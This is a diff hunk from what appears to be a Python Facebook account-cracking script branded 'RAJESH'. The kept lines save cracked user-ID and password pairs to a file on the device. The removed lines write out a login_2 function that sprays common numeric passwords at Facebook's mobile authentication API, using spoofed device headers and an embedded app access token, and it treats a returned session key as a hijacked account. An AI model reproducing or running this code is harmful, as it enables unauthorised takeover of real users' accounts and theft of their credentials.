@@ -375,28 +375,3 @@ try:
                     print(f"\r\r\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")
                     open('/sdcard/RAJESH-OLD-M1-OK.txt', 'a').write(uid + '|' + pw + '\n')
                     oks.append(uid)
-                    return None
-                continue
-            loop += 1
-        except Exception:
-            time.sleep(5)
-
-    def login_2(uid):
-        global loop
-        sys.stdout.write(f"\r\r\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37m🧬𝐑𝐀𝐉𝐄𝐒𝐇-M2\x1b[38;5;196m🇮🇳)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{loop}\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[1;37mOK\x1b[38;5;196m)\x1b[1;37m>\x1b[38;5;196m×\x1b[1;37m<\x1b[38;5;196m(\x1b[38;5;192m{len(oks)}\x1b[38;5;196m)")
-        try:
-            for pw in ('123456789', '123456', '1234567', '12345678', '1234567890'):
-                with requests.Session() as session:
-                    headers = {
-                        'x-fb-connection-bandwidth': str(rr(20000000, 29999999)),
-                        'x-fb-sim-hni': str(rr(20000, 40000)),
-                        'x-fb-net-hni': str(rr(20000, 40000)),
-                        'x-fb-connection-quality': 'EXCELLENT',
-                        'x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA',
-                        'user-agent': wind(),
-                        'content-type': 'application/x-www-form-urlencoded',
-                        'x-fb-http-engine': 'Liger' }
-                po = (session.get('https://b-api.facebook.com/method/auth.login?format=json&email=' + str(uid) + '&password=' + str(pw) + '&credentials_type=device_based_login_password&generate_session_cookies=1&error_detail_type=button_with_disabled&source=device_based_login&meta_inf_fbmeta=%20¤tly_logged_in_userid=0&method=GET&locale=en_US&client_country_code=US&fb_api_caller_class=com.facebook.fos.headersv2.fb4aorca.HeadersV2ConfigFetchRequestHandler&access_token=350685531728|62f8ce9f74b12f84c123cc23437a4a32&fb_api_req_friendly_name=authenticate&cpl=true', headers=headers).json())
-                if 'session_key' in str(po):
-                    print(f"\r\r\x1b[38;5;196m(🌏\x1b[1;37mRAJESH🧬\x1b[38;5;196m) \x1b[1;97m= \x1b[38;5;46m{uid} \x1b[1;97m= \x1b[38;5;46m{pw} \x1b[1;97m= \x1b[38;5;45m{creationyear(uid)}")  
-    
